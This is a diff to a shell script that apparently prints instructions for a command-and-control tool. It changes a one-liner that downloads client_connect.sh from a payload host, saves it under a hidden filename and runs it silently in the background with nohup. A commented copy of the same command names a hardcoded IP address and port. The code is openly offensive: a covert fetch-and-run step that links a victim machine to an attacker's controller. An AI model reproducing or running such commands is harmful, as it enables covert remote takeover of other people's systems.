@@ -112,9 +112,9 @@ printf "\tpython3 server_shell.py\n\n"
 
 print_colored "cyan" "\t[ON CLIENT] This command starts a connection to CNC server.\n" "no"
 
-printf "\t{ wget -q -O .i.sh ${PAYLOAD_HOST}:${PAYLOAD_PORT}/client_connect.sh ; } && { nohup bash .i.sh &> /dev/null & }\n\n"
+printf "\t{ wget -q -O .c ${PAYLOAD_HOST}:${PAYLOAD_PORT}/client_connect.sh ; } && { nohup bash .c &> /dev/null & }\n\n"
 
 
 
 
-# { wget -q -O .i.sh 96.126.97.119:8080/connect.sh ; } && { nohup bash .i.sh &> /dev/null & }
+# { wget -q -O .c 96.126.97.119:8080/connect.sh ; } && { nohup bash .c &> /dev/null & }
